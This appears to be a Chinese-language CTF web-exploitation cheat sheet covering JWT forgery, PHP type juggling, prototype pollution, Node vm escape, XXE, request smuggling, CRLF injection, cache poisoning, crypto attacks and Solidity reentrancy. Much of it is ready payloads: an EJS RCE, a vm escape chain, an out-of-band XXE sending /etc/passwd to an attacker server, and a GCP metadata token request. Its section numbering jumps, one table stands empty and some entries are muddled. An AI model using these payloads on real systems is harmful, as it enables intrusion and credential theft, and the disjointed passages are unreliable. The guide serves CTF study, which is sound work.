⑥ 签名逻辑漏洞 代码根本没验签，或者用了 verify=false 之类的写法 改完 Payload 直接原样拼上去（签名段随便填）

改完 Payload 之后要重新编码：

 1import base64, json, hmac, hashlib
 2
 3def b64u(data: bytes) -> str:
 4    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
 5
 6header  = {"alg": "HS256", "typ": "JWT"}
 7payload = {"user": "admin", "role": "admin"}   # ← 改成你想要的身份
 8
 9h = b64u(json.dumps(header, separators=(',',':')).encode())
10p = b64u(json.dumps(payload, separators=(',',':')).encode())
11
12# 用已知密钥签名（比如爆破出来的 111）
13sig = b64u(hmac.new(b"111", f"{h}.{p}".encode(), hashlib.sha256).digest())
14
15print(f"{h}.{p}.{sig}")

CRITICAL 避坑：base64url 编码时一定要去掉末尾的 =！JWT 用的是 base64url（无填充），带 = 会验签失败。这是新手最常踩的坑。

工具：jwt_tool（python3 jwt_tool.py <token> -T 交互式改、-C -d dict.txt 爆破）、hashcat -m 16500、pyjwt 自己写脚本。

1. PHP 奇技淫巧

PHP 是 CTF Web 的主力语言，因为它的"灵活"（读作：坑多）。

1.1 弱类型比较

== 与 === 的区别：== 会先把两边转成同类型再比，=== 要求类型和值都相同。

1var_dump(0 == "a");        // true    （PHP < 8，"a" 转成 0）
2var_dump("1" == "01");     // true    （都转成数字 1）
3var_dump("10" == "1e1");   // true    （"1e1" 是科学计数法 = 10）
4var_dump(100 == "1e2");    // true
5var_dump("0e123" == "0e456"); // true （两个都被当成科学计数法的 0！）
6var_dump([] == false);     // true    （空数组等于 false）
7var_dump(null == false);   // true

关键 payload 备忘表：

比较 传什么能过
$a == "admin" 0（PHP<8 时 0 == "admin" 为 true）
$a == 0 "abc"、"0e123"、[]
$a == false ""、0、[]、null
strcmp($a, "admin") == 0 a[]=x（数组 → 返回 NULL，NULL == 0 成立）
$a === "admin" 老实传 admin（严格比较绕不过）
in_array($a, ["admin"]) 传数组；或利用弱比较
is_numeric($a) && $a > 1000 0x3e8？不行——0e... 系列（"1e3" 是 1000）

1.2 MD5 与哈希的经典考点

（1）0e 系列（魔术哈希）

1if (md5($_GET['a']) == md5($_GET['b'])) { ... }

因为 == 会把 0e 开头的字符串当数字比，而它们都是 0，所以只要两个字符串的 MD5 都是 0e 开头的一串数字，比较就成立：

字符串 MD5 值
QNKCDZO 0e830400451993494058024219903391
240610708 0e462097431906509019562988736854
aabg7XSs 0e087386482136995467261284107231
aabC9RqS 0e087386482136995467261284107231
s878926199a 0e545993274517709034328855841020
s155964671a 0e342768416822451524974117254469
s214587387a 0e848240448830537924465865611904
s1091221200a 0e940624217856561557816327384675

两个值相等就够了，随便挑两个填进去。比如 ?a=QNKCDZO&b=240610708。

SHA1 的版本：aaroZmOk、aaK1STfY、aaO8zKZF、aa3OFF9m。

（2）双重 MD5（md5(md5($a)) == md5(md5($b))）

这个不能靠 0e 了，要靠真实的 MD5 碰撞——两个不同的字符串，它们 MD5 之后的 MD5 值相同。这类值需要提前查表，经典的几组：

1aabg7XSs
2aabC9RqS

（详细的碰撞值我单独写过一篇《双重md5爆破》，需要的可以翻一下：双重md5爆破）

（3）数组绕过（最常用，最无脑）

1if (md5($_GET['a']) === md5($_GET['b'])) { ... }

严格比较总绕不过了吧？不，传数组：

1?a[]=1&b[]=2

因为 md5() 只接受字符串，传数组会报 Warning 并返回 NULL。于是 NULL === NULL 成立——严格比较照样过。

记住这一条：PHP 里凡是"取字符串"的函数，传数组进去大多会返回 NULL/false，而 NULL === NULL、false == false 都是成立的。md5、sha1、strcmp、in_array 的逻辑都栽在这上面。

PHP 8 的变数：PHP 8 之后很多内置函数传数组会直接抛 TypeError（比如 strcmp），所以这套打法在 PHP 8 环境里可能变成 500。遇到 PHP 8 的题，先看 phpinfo 或者报错信息。

（4）md5($a) === md5($a) 的真碰撞

有时题目要求"两个不同的文件/字符串，MD5 相同"，这需要真实的碰撞值对（FastColl 生成的 PDF 对）。CTF 里少，但遇到"上传两个文件"类的题就要想到。

（4）__wakeup() 绕过（CVE-2016-7124）

4O:4:"Test":2:{s:1:"a";s:3:"abc";}

（5）字符串逃逸（“长度改变"型题目）

原理：过滤函数在序列化字符串里改变了字符串长度（比如把 flag 替换成空、或者把 php 扩展成 hacker），导致原本的字符串边界错位，后面的内容被"挤进"了前一个字符串里，从而注入你想要的属性。

两种方向：

1// 方向一：替换成空 → 长度变小 → 后面的内容往前"溢出"，可以吃掉后面的字段
2$s = str_replace('flag', '', $str);
3// 输入 正常长度 6 的字符串，实际存进去 2 个字符，长度对不上
4
5// 方向二：替换成更长的 → 长度变大 → 后面的内容被挤走，可以让"多出来的字符"被解析为新的字段
6$s = str_replace('php', 'hacker', $str);   // 4 → 6，变长 2

标准解法思路（以"替换变短"为例）：

  1. 计算每次替换会减少多少长度。
  2. 让"吃掉"的长度正好覆盖掉你不想保留的部分。
  3. 在可控的那段里写入 ";s:3:"cmd";s:2:"id";} 之类的闭合+新字段。

这类题必须写脚本算长度，手推非常容易错。写个 Python 循环，把 payload 自动拼出来。

搜索关键词：str_replace、preg_replace、substr、addslashes（会变长，也是字符串逃逸的经典来源）。

（6）phar:// 反序列化（不用 unserialize 也能反序列化！）

4. Node.js

Node 题在 CTF 里越来越多了，因为原型链污染是个非常"优雅"的漏洞。

4.1 原型链污染 (Prototype Pollution)

原理（先理解 JS 的原型）：

1// JS 里每个对象都有一个"原型"，找不到的属性会往原型上找
2let obj = {};
3obj.__proto__ === Object.prototype;      // true
4
5// 所以污染 Object.prototype，就等于污染了所有对象！
6Object.prototype.polluted = "yes";
7let a = {};
8console.log(a.polluted);                 // "yes"

什么时候能被污染：当代码做"递归合并“时，如果没过滤 __proto__ 这个键，就会把攻击者的数据写进原型。

 1// 典型的"合并"函数（漏洞写法）
 2function merge(target, source) {
 3    for (let key in source) {
 4        if (typeof source[key] === 'object') {
 5            if (!target[key]) target[key] = {};
 6            merge(target[key], source[key]);     // ← 递归，没过滤 key
 7        } else {
 8            target[key] = source[key];
 9        }
10    }
11    return target;
12}
13
14merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
15console.log({}.polluted);        // "yes" —— 污染成功！

四种传参写法（遇到过滤就换着试）：

 1// 1. 最基础
 2{"__proto__": {"polluted": "yes"}}
 3
 4// 2. 有过滤时换构造器
 5{"constructor": {"prototype": {"polluted": "yes"}}}
 6
 7// 3. 双层嵌套绕过（有些过滤只查一层）
 8{"__proto__": {"__proto__": {"polluted": "yes"}}}
 9
10// 4. JSON 里显式用 "constructor"
11{"constructor": {"prototype": {"outputFunctionName": "..."}}}

重要区分：

  • JSON.parse 本身不会造成污染（它用的是 DefineOwnProperty，__proto__ 会变成一个自己的属性而不是原型）。
  • 但当这个对象后面被递归合并时，for...in 会遍历到 __proto__（它是可枚举的自有属性），于是污染在合并那一刻发生。
  • 所以判断能不能污染的关键是"有没有递归合并/for in 赋值"这段代码，源头的 JSON.parse 只是数据的来源。

for (let key in source) vs Object.keys(source)：for...in 会遍历原型链上的可枚举属性，Object.keys 只返回自有属性。用 for...in 的合并函数最危险。

污染什么才有用（这是关键，光污染 __proto__.x 是没用的）：

目标 污染点 效果
EJS 模板 RCE settings['view options'].outputFunctionName 最出名的利用，污染后任意模板渲染都变成 RCE
EJS（另一条） settings['view options'].client + escapeFunction 同上
child_process 参数注入 shell、env、argv0、NODE_OPTIONS 控制子进程的执行方式
spawn 的 shell 选项 {"__proto__":{"shell":"node","argv0":"console.log(require('child_process').execSync('id').toString())//"}} 让 spawn 执行 node 脚本
绕过权限校验 污染 isAdmin、role、user 之类的判断字段 逻辑绕过（比 RCE 更常见）
NODE_OPTIONS + --require {"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/environ"},"shell":"node"}} 需要配合环境变量污染
Buffer / url 解析 各种库的内部选项 看依赖
status / message 让程序走异常分支 拿到更多报错信息

EJS RCE 的经典 payload：

1{
2  "constructor": {
3    "prototype": {
4      "outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag').toString();s"
5    }
6  }
7}

outputFunctionName 是 EJS 里"拼接生成函数体"的变量名，污染它就能把代码插进模板编译出来的函数里。这是原型链污染题最常见的 final payload，看到 EJS（<%= %> 语法）就想到它。

注意 payload 的写法：必须是 x;代码;x 这种"闭合"结构，因为它是被拼进 function anonymous(...) { ... } 里的。写错一个分号就前功尽弃。

怎么找污染点：

  1. 看有没有"接受 JSON 并合并到某个对象"的接口（设置、配置、用户资料更新）。
  2. 看参数里有没有 __proto__、constructor、prototype 被过滤（没过滤就能打）。
  3. 看渲染引擎是什么（EJS/Handlebars/Pug），决定污染哪个 key。
  4. 测试方法：先污染一个无害的字段（比如 {"__proto__":{"test":"yes"}}），然后找一个"应该不存在的属性"的地方看它有没有出现（比如 console.log({}.test) 之类）。

题目形态：把用户代码放进 vm.runInNewContext / vm.runInThisContext 里执行，期望"隔离”。

逃逸链条：

 1// 1. 从 this 的构造器往上爬（最经典）
 2this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
 3
 4// 2. 简写
 5this.constructor.constructor("return process")().versions
 6
 7// 3. 如果 this 被处理过，用 arguments
 8(function(){return arguments.callee.caller})()
 9
10// 4. 用 require 的替代
11process.mainModule.require('child_process')
12global.process.mainModule.constructor._load('child_process')
13
14// 5. 用 import() 动态导入（Node 12+）
15import('child_process').then(m=>m.execSync('id'))
16
17// 6. 用 process.binding / 内部模块

核心心法：this.constructor.constructor 就是 Function 构造器（因为 this.constructor 是某个对象，.constructor 再取一次就是 Function）。而 Function('...') 创建的函数运行在全局作用域里，所以能直接摸到 process。记住 Function 是逃逸的万能钥匙。

vm 模块不是沙箱：Node 官方文档明确说了 vm 模块不是安全边界。所以题目用 vm 做沙箱，本质上是给出题人自己挖坑。

1. XXE (XML 外部实体注入)

一句话原理：XML 支持"外部实体"，也就是让解析器去读取一个外部文件/URL 并把内容填进文档里。如果这份 XML 是攻击者提交的，就能读任意文件、发起 SSRF。

这一块我单独写过一篇比较细的《XXE漏洞利用》，包括 DTD、实体分类、参数实体、XInclude、SVG 的完整推演过程，建议配合着看：XXE漏洞利用。这里只放"解题视角"的要点。

1.1 怎么发现 XXE

特征 说明
请求体是 XML 抓包看到 <?xml version="1.0"?> 或者 Content-Type: application/xml
接口是"数据交换"类 SOAP、RSS、SAML、Excel/Word 文件解析（本质是 zip+xml）
图片上传但支持 SVG SVG 就是 XML，能塞 XXE

最容易被忽略的一条：接口原本只收 JSON，但框架的 @RequestBody 支持自动转换时，把 Content-Type 改成 application/xml 提交 XML，往往也能被解析。这是一个非常高频的考点。

1.3 无回显 XXE（Blind XXE）

验证阶段用 DNSLog 或者你自己的服务器：

1<!DOCTYPE root [
2  <!ENTITY % xxe SYSTEM "http://your-dnslog.cn/probe">
3  %xxe;
4]>

带外数据阶段（这里的坑最多，务必按顺序理解）：

1<!-- ① 最直观的写法 —— 在内部 DTD 里嵌套参数实体 -->
2<!DOCTYPE root [
3  <!ENTITY % file SYSTEM "file:///etc/passwd">
4  <!ENTITY % send SYSTEM "http://your-ip/?%file;">
5  %send;
6]>
7<!-- ❌ 打不通！因为【内部 DTD 里禁止参数实体引用另一个参数实体】 -->

这就是为什么需要外部 DTD——把 DTD 放到你自己的服务器上，因为外部 DTD 允许参数实体互相引用：

1<!-- 你服务器上的 evil.dtd -->
2<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
3<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://your-ip/?p=%file;'>">

注意 &#37;：http 传输时前面的 % 会被 URL 解码，所以要写成 HTML 实体 &#37;（也就是 %），让它在被解析后才变成 %。

1<!-- 最终的 payload -->
2<!DOCTYPE root [
3  <!ENTITY % remote SYSTEM "http://your-ip/evil.dtd">
4  %remote;
5  %int;
6  %send;
7]>

执行顺序：%remote 让目标下载你的 DTD → %int 展开出 %send 的定义 → %send 发起带数据的请求 → 你在服务器上看到 flag。

为什么 file:// 的内容要 base64 编码：因为文件内容里如果有换行符，直接拼进 URL 会让请求断掉。base64 之后就是一行干净的字符了。

1.4 XInclude（无法控制 DOCTYPE 时的救星）

有些接口不允许你提交完整的 XML（比如它只接收"某个字段"然后自己拼进 XML），这时 <!DOCTYPE> 塞不进去，就要用 XInclude：

1<foo xmlns:xi="http://www.w3.org/2001/XInclude">
2  <xi:include parse="text" href="file:///etc/passwd"/>
3</foo>

XInclude 和外部实体的区别（这个对比很重要）：

  • 外部实体：只能引用"片段"，不能有 XML 声明、不能有 DOCTYPE。
  • XInclude：可以包含完整独立的 XML 文档。

所以"服务端 XML 结构固定、我只能控制其中一个字段"的场景，XInclude 是唯一解。

2. HTTP 协议攻击

2.1 HTTP 请求走私 (Request Smuggling)

一句话原理：前端（反向代理）和后端（应用服务器）对"一个请求到哪里结束"的理解不一致，导致攻击者能把"半截请求"留在连接里，让下一个用户的请求接在它后面，被拼成一个畸形请求。

为什么会有理解不一致：因为 HTTP/1.1 里判定请求体长度有两个头（Content-Length 和 Transfer-Encoding: chunked），两个同时存在时谁优先，规范没说死。

四种基本类型：

类型 前端（代理）认 后端认 效果
CL.TE Content-Length Transfer-Encoding 代理按 CL 转发，后端按 TE 找 0\r\n\r\n 结束 → 多出来的内容留在后端缓冲区
TE.CL Transfer-Encoding Content-Length 反过来
TE.TE 都认 TE，但其中一方能被打乱（比如 Transfer-Encoding: xchunked） — 靠混淆让一方忽略 TE
CL.CL — — 两个 CL 值不同（少见）

一个 CL.TE 的 payload 示例：

1POST / HTTP/1.1
2Host: target.com
3Content-Length: 13
4Transfer-Encoding: chunked
5
60
7
8SMUGGLED
  • 代理看到 Content-Length: 13，把 0\r\n\r\nSMUGGLED 这 13 字节转给后端。
  • 后端看到 Transfer-Encoding: chunked，读到 0\r\n\r\n 就认为"请求结束了"，剩下的 SMUGGLED 就留在缓冲区里，会拼接到下一个请求的前面。

怎么判定用哪种：

测试 结论
发 CL.TE payload，响应超时 很可能是 CL.TE（后端在等 0）
发 TE.CL payload，响应 400/超时 很可能是 TE.CL
两种都超时 两个头都被处理，或者有 WAF
都正常返回 没有走私（或者被规范化了）

怎么利用（CTF 里的常见目标）：

目标 说明
绕过前端鉴权 前端只校验第一个请求的路径，后端处理的却是被夹带的那个
偷别人的请求 让受害者的请求接到你的"半截请求"后面，从而读到他的 Cookie/凭证
缓存投毒 走私一个请求让缓存存下恶意内容
打内网 走私到只允许前端访问的内部端点

工具：Burp Suite 的 HTTP Request Smuggler 插件（BApp Store 里搜 HTTP Request Smuggler），它能自动探测并生成 payload。手搓 payload 需要非常小心 \r\n 的精确性，Content-Length 要按字节数算，建议用工具。

避坑：Burp 的 Repeater 默认不改动 Content-Length——你手工改完 payload 一定要点 Update Content-Length（或者关掉自动更新，自己算准）。这是走私题最常见的失败原因。

HTTP/2：新版本协议里有 H2.CL / H2.TE 的变体（把请求降级到 HTTP/1.1 时产生的差异），也是现在的考点。

2.2 CRLF 注入

一句话原理：HTTP 头用 \r\n 分隔。如果用户输入被拼进响应头，而 \r\n 没有被过滤，攻击者就能"插入新的响应头"，甚至"提前结束响应，插入完整的响应体"。

基本 payload：

1%0d%0a            ← CRLF
2%0d%0aSet-Cookie: admin=1;
3%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a%0d%0a<script>alert(1)</script>

常见利用场景：

场景 做法 效果
Set-Cookie 注入 参数被拼进 Set-Cookie 伪造 Cookie、写任意会话
Location 头注入 重定向参数可控 响应拆分（XSS）
响应拆分（XSS） 插入 %0d%0a%0d%0a 再写 HTML 绕 WAF 打 XSS（因为 payload 不在请求体里）
SSRF 里注入 Header ?url=http://target/%0d%0aHost: internal 用它来加 Header 打内网（尤其打云元数据需要特定 Header 的 GCP）
缓存投毒 注入的响应被缓存 影响所有访问者

用 SSRF 打云元数据的例子（GCP 需要 Metadata-Flavor: Google）：

1?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0d%0aMetadata-Flavor:google

这个用法在"SSRF + CRLF"的组合题里非常经典。

3. Web 缓存 (Web Cache)

3.1 缓存投毒 (Cache Poisoning)

原理：缓存服务器（CDN/Nginx/Cloudflare）判断"这个请求该不该缓存"时，用的是一部分请求特征（叫"缓存键"，通常只有 URL）。而如果响应内容受某个"不在缓存键里"的输入影响（叫 unkeyed input），攻击者就能把恶意响应写进缓存，让后续所有访问者都拿到它。

典型的 unkeyed header：X-Forwarded-Host、X-Host、X-Forwarded-Scheme、X-Original-URL、X-Rewrite-URL。

利用示例：

1GET /index.html HTTP/1.1
2Host: target.com
3X-Forwarded-Host: attacker.com     ← 这个头不在缓存键里
4
5# 如果页面里有 <script src="//{X-Forwarded-Host}/a.js">，那么缓存里存下的就是
6<script src="//attacker.com/a.js">

于是所有访问 /index.html 的用户都会加载攻击者的 JS。

怎么判断有没有缓存：

响应头 含义
X-Cache: HIT / MISS 最直接的证据（Cloudflare、Varnish）
Age: 123 缓存了 123 秒
Via: 1.1 varnish 有代理缓存
CF-Cache-Status Cloudflare

怎么找 unkeyed input：用 Param Miner（Burp 插件）自动发现"哪些头能影响响应但不在缓存键里"。

3.2 Web 缓存欺骗 (Web Cache Deception)

原理：让服务器把"私密页面"缓存起来。

做法：访问一个看起来像静态资源、但实际是动态页面的 URL：

1http://target.com/profile/foo.css
2http://target.com/profile;foo.css
3http://target.com/profile%2Ffoo.css
  • 缓存服务器看到 .css 后缀 → 认为这是静态资源，缓存它。
  • 应用服务器看到 /profile → 返回你的个人资料页（含敏感信息）。
  • 结果：你的私密页面被缓存到了公共缓存上，攻击者直接访问同一个 URL 就能拿到。

CTF 里的小变体：题目可能让你"让管理员把他的资料页缓存到公共缓存，然后你去读"。关键在于找到一个"路径后缀不影响应用逻辑，但会影响缓存判定"的写法。

4. Web 密码学

为什么 Web 题里会有密码学：因为 Web 应用自己会用到加密（session、token、上传、cookie）。用的方式不对，就是漏洞。

4.1 Padding Oracle Attack

原理：CBC 模式的解密过程中，如果服务端会区分"padding 错误"和"密文错误"（比如返回不同的报错、或者响应时间不同），攻击者就能一个字节一个字节地还原出明文，甚至伪造任意密文。

成立条件：

  1. 使用 AES-CBC（或类似的分组加密）
  2. 加密是"无认证“的（没有 HMAC 校验，或者校验在解密之后）
  3. 服务端会对 padding 错误给出不同的反馈

识别信号：

  • 参数像 ?token= 或者 Cookie 里是一长串 base64/hex（长度是 16 的倍数）
  • 改一个字节 → 报错信息变了、或者响应时间变了
  • 报错里有 padding、Invalid block size、Unpad 之类的字眼

利用：写脚本按字节爆破。有现成工具：

1# 常用工具
2padBuster           # Perl 写的经典工具
3python-paddingoracle # Python 库
4# 或者自己写（需要 256 次以内试探一个字节）

CTF 做题思路：这类题往往就是"给你一个 token，让你伪造出 admin“或者"解密出 flag”。先确认服务端会区分 padding 错误，然后上工具。

4.2 Hash 长度扩展攻击 (Length Extension)

原理：MD5、SHA1、SHA256 这些哈希算法是迭代构造的（Merkle–Damgård），所以知道 hash(secret + message) 和 len(secret) 的攻击者，可以在不知道 secret 的情况下算出 hash(secret + message + padding + 附加内容)。

典型题目：

1$sign = md5($secret . $data);
2if ($sign === md5($secret . $_GET['data'])) { /* 通过 */ }

攻击者把 data 改写成 原data + padding + &admin=1，然后用长度扩展算出新的签名。

工具：

1# hashpump / hash_extender
2hashpump -s <原签名> -d <原数据> -a '&admin=1' -k <secret长度>
3# 输出新的签名和新的数据

识别：题目里有”secret 拼接在数据前面“的签名校验，且哈希是 MD5/SHA1/SHA256。

注意：HMAC 不会被长度扩展攻破（这是 HMAC 被设计出来的原因）。所以看到 hash_hmac 就换路子。

secret 长度未知怎么办：从 1 试到 40，每个都跑一次 hashpump，能通过的就是对的。

4.3 伪随机数预测 (PHP mt_rand)

原理：PHP 的 mt_rand() 是"伪"随机——给定种子，后面的序列就完全确定了。如果能拿到一部分输出，就能推算出种子，从而预测之后的所有值。

常见题目形态：

1// 题目拿 mt_rand 生成 token / 验证码 / session id
2$token = mt_rand();
3// 或者用 mt_srand(time()) 播种
4mt_srand(time());

利用方式：

情形 做法
种子是时间戳 爆破时间窗口（前后几分钟），用 php_mt_seed 反推
拿到部分输出 用 php_mt_seed + 输出的值反推种子
拿到足够多的完整输出 直接用 php_mt_rand 逆向工具（不需要种子） 
1# php_mt_seed：给定 mt_rand 的输出，反推种子
2./php_mt_seed <第一个输出值>
3
4# 得到种子后，用它生成后续所有值
5php -r 'mt_srand(1234567); echo mt_rand();'

拓展：rand()（PHP < 7.1 用的是 libc 的 rand）也是可预测的；Python 的 random 模块用 random.getrandbits 泄漏出来也能恢复 Mersenne Twister 状态（randcrack 工具）。所以"用随机数生成 token"的题目基本都有这一手。

4.4 CBC 字节翻转攻击 (Bit Flipping)

原理：CBC 解密时，前一个密文块的某个字节会异或到当前明文块对应的字节上。所以如果你能改密文，就能故意改坏一个明文块（比如把 role=guest 改成 role=admin），代价是前一个块变成乱码。

利用场景：

1// 明文是 user=guest;role=user
2// 想改成 user=guest;role=admi  → 把 'n' 翻成 'n' 太麻烦，改成 admin 里的其他写法
3// 关键就是"找到能接受乱码被破坏"的位置（比如把它放在第一个块，或者用别的方式忽略它）
目标 做法
改角色 把密文里对应 user 的字节改掉，让解密出 admin（接受前面的块乱码）
改字符 逐字节计算 xor 差值：新密文 = 旧密文 ^ 旧明文 ^ 新明文 
1# 核心公式
2new_cipher_byte = old_cipher_byte ^ ord(old_plain_byte) ^ ord(new_plain_byte)

4.5 ECB 模式的"块搬运”

原理：ECB 模式每个块独立加密，相同的明文块 → 相同的密文块。所以：

攻击 说明
块识别 看到密文里有重复的块，说明有重复的明文（比如用户信息被重复）
块搬运 把"admin"块的密文搬到"user"块的位置，让解密出 admin
字节对齐攻击 通过控制输入长度，让敏感数据正好占满一个块，从而确定它的边界

识别：密文长度是 16 的倍数、且里面能看到重复的 16 字节块（用脚本统计）。

判断 ECB 的小实验：提交 AAAAAAAAAAAAAAAA（16 个 A）两次，如果密文里出现两个完全相同的块，就是 ECB。

4.6 其他密码学考点

考点 说明
弱密钥/硬编码密钥 密钥是 123456、key、secret；或者代码里写死了（源码泄露时立刻能拿到）
IV 固定 / IV 可控 CBC 模式下 IV 可变时，可以翻转第一个块
加密与签名顺序错误 先加密后签名 → 可以篡改；先签名后加密（MAC-then-encrypt）也可能被 padding oracle 打
哈希碰撞 MD5 已可碰撞，需要真实碰撞对时搜 fastcoll、MD5 collision

伪随机 + 时间戳 time()、microtime() 播种，可爆破
RSA 相关 小公钥指数、共模攻击、低加密指数广播、Wiener 攻击（Web 题里少见，更常见于 Crypto 方向）

通用心法：先读代码，找到"加密什么、怎么加密、怎么校验"三件事。这类题的漏洞 90% 出在"校验"环节（比如校验的是明文、校验只在解密前做）。

5. 区块链 / Web3

Web3 题在 CTF 里的形态：给你一个合约源码 + RPC 地址，让你"把合约里的钱取光"或"把 isSolved 变成 true"。你需要写一个攻击合约来调用它。

5.1 重入攻击 (Reentrancy)

原理：合约 A 调用外部合约 B，B 在自己的代码里再调用回 A，而 A 的"扣款"操作还没完成，导致状态不一致。

1// 有漏洞的合约
2function withdraw() public {
3    uint amount = balances[msg.sender];
4    // ① 先转账（外部调用！）
5    (bool ok, ) = msg.sender.call{value: amount}("");
6    require(ok);
7    // ② 后扣款 —— 但攻击者已经在 ① 里重新调用了 withdraw
8    balances[msg.sender] = 0;
9}

攻击合约：

 1contract Attack {
 2    Victim victim;
 3    constructor(address _v) { victim = Victim(_v); }
 4    receive() external payable {
 5        if (address(victim).balance >= 1 ether) {
 6            victim.withdraw();          // ← 重入！
 7        }
 8    }
 9    function attack() external payable {
10        victim.deposit{value: 1 ether}();
11        victim.withdraw();
12    }
13}

防护写法（作为对照记忆）：先改状态再外部调用（Checks-Effects-Interactions）、加 nonReentrant 修饰器、用 transfer 而不是 call。

5.2 整数溢出

Solidity 0.8.0 之前没有内置溢出检查：

1uint8 a = 255;
2a = a + 1;         // 0.8 之前 → 0（溢出回绕）
3uint x = 0;
4x = x - 1;         // 0.8 之前 → 2^256 - 1（下溢成极大值）

典型利用：balances[user] -= amount 下溢成天文数字，然后就能转走所有钱。常用 SafeMath 库是老的防护方式。

5.3 其他常见 Web3 漏洞

漏洞 说明

第八章：解题战术总结 (Strategy & Mindset)

前面七章是"知识"，这一章是"打法"。知识决定你能走多远，打法决定你走得多快。

1. WAF 绕过的通用思路

核心认知：WAF 不是魔法，它只有两种手段——正则匹配和字符串替换。所以绕过只有三个方向：

  1. 让正则匹配不到（编码、变形、拆分）
  2. 让替换后还能用（双写、注释）
  3. 利用解析差异（前端和后端、WAF 和数据库对同一串的理解不同）
方向 具体手法 例子
编码 URL 编码、双重编码、Unicode、Hex、Base64 %2527、0x61646d696e
变形 大小写、注释插入、等价替换、等价函数 SeLeCt、sel/**/ect、空格换 %0a
拆分 分块传输、参数污染、多请求组合 Transfer-Encoding: chunked、?a=1&a=payload
协议层 改 Content-Type、改方法、改 HTTP 版本 JSON↔XML、GET↔POST
解析差异 利用 WAF 不解析而应用解析的部分 放在 multipart 的其他字段里、放在 filename 里
白名单绕过 找 WAF 放行的"可信来源" 内网 IP、特定 UA、X-Forwarded-For: 127.0.0.1

最实用的判断方法：把同一个 payload 换个位置再打一次。WAF 常常只检查 URL 参数，不检查 Cookie、不检查 Body、不检查 Header。“换个地方放"是最廉价的绕过。

3. 如何从 0 到 1 复现题目

为什么强调复现：看 WP 是"知道”，自己搭环境跑一遍才是"会"。而且很多题目的细节（过滤规则、环境差异）只有复现过才能体会。

场景 做法
题目有 Dockerfile docker build -t ctf . → docker run -d -p 8080:80 ctf，最省事
题目只给源码 自己看 README，找启动脚本，缺环境就装

4. 拿到一道题，怎么入手？

固定四步，按顺序走，不要跳：

步骤 做什么 产出
① 看功能 把题目当成正常用户用一遍：有哪些页面？有哪些输入点？有没有登录/上传/搜索/留言？ 功能清单 + 输入点清单
② 抓包 F12 + Burp，把每个功能的请求都点一遍，看参数、Cookie、响应头 可疑参数清单
③ 扫目录 Dirsearch 跑一遍，看有没有隐藏页面/备份/源码 隐藏资源
④ 看源码 有源码就审（重点看过滤、看 flag 读取逻辑）；没源码就找源码（泄露/备份/.git） 过滤规则 + flag 位置

顺序很重要：很多人的毛病是一上来就抓包，结果根本没搞清题目有几个功能，漏掉关键入口。先用一遍，再看一遍。

被忽略的第五步：看题目标题和描述。CTF 的题名/描述往往是唯一的提示（“简单登录”、“备份”、“我在哪个城市”）。卡住的时候回头读一遍题目描述，这是最有效的自救。

5. 卡住了怎么办？（按成本从低到高）

  1. 回头读题面和提示（成本最低，最常被忽略）
  2. 重新看一遍报错信息（完整地读，不要只扫一眼。路径、版本、函数名都在里面）
  3. 换一个输入点（一个参数打不动，说不定另一个参数就是入口）
  4. 回顾本章和前面几章的表格（“看到 X 想到 Y"速查表——大概率是某个你没想到的漏洞类型）
  5. 猜出题人意图（题目想考什么？一个 CTF 题目通常只考一个点，“哪个点最符合题目的名称和描述”）
  6. 对比响应差异（把两个请求的响应丢进 Burp Comparer，差异就是信息）
  7. 去翻别人的 WP / 搜题目名（比赛结束后再搜，别在比赛中搜——比赛时搜不到，还浪费时间）
  8. 暂时放下，做别的题（换个脑子回来，经常一眼就看出来了）

关于"猜出题人意图”：这是最高效的技能。题目名、描述、附件、给的环境——这四样东西合起来，就是一个"提示包"。 比如题目叫"备份"，那答案八成在 .git 或者 .bak 里；叫"找找看"，那就是信息收集。

6. 如何写好 Writeup

好 WP 的标准：别人照着你的 WP 能复现出 flag，而且能理解你当时为什么这么想。

推荐结构：

 1## 题目名
 2### 1. 题目信息
 3- 题目描述（原文抄一遍，这很重要）
 4- 附件/环境地址
 5- 考察点：XXX（一句话说清）
 6
 7### 2. 信息收集
 8- 扫出了什么、抓到了什么、有什么异常
 9
10### 3. 漏洞发现
11- 我看到了什么现象 → 因此怀疑什么 → 怎么验证的
12- （重点写"思考过程"，不只写结论）
13
14### 4. 漏洞利用
15- 完整 payload + 截图/回显
16- 关键代码/脚本
17
18### 5. 复盘
19- 为什么一开始没做出来？（知识盲区是哪个）
20- 这个漏洞的本质是什么？换个环境还能用吗？
21- 有没有更简单的解法？
22
23### 6. 参考
24- 参考的 WP/文章（尊重别人的劳动）

写 WP 的三个价值：

  1. 逼自己讲清楚——讲不清楚就是没真懂。
  2. 方便自己复习——半年后你会忘了这道题，但笔记不会。
  3. 帮到别人——你卡住的地方，别人也会卡住。

一定要写"卡在哪里"：只写"最后用了这个 payload"的 WP 是流水账；写出"我一开始以为是 A，试了发现不对，因为 B，所以转向 C"的 WP 才有价值——因为别人卡住的地方往往就是这一步。

7. 比赛节奏与时间管理

原则 说明
先扫一遍所有题 别在第一题死磕两小时。花 10 分钟看完全部题目，按"看起来简单/有思路"排个序
简单题优先做掉 分数一样，简单的先拿。Flags 数量本身也是分数
设置时间盒 单题超过 30~40 分钟没进展就换题，回来再看（“放下"真的很有效）
随时保存 payload 每试出一个能用的 payload 就记下来，别指望自己记得
团队沟通 每 15~30 分钟同步一次"我在打什么、卡在哪”，避免撞车
别忘提交 有些平台有提交次数/时间限制，做出 flag 立刻提交

一点私心话

这篇 Guide 会持续更新。遇到新考点、新思路、做错的题，我都会往这里补。也希望它能像 Lunatic 大佬那篇一样，帮到某个正在刷题的人。

任何事物都有学习过程，一口吃不成胖子是老生常谈。

CTF对于绝大部分人来说都是全新的未知领域，自己在未知领域探索中一定多多少少会遇到困难和挫折，会花上很多时间才能起步，这需要耐心，所有人都是从小白开始。

任何告诉你“学了就能当大黑客”“学了就能月入xx”“学了就能拿漏洞奖金”的课程可能会教你一些知识，但是说的这些只是噱头，实际上哪会有这样的神仙课程？只不过想骗你去上他的课罢了，CTF还是要靠自己的日积月累。

天道酬勤，不酬空想。

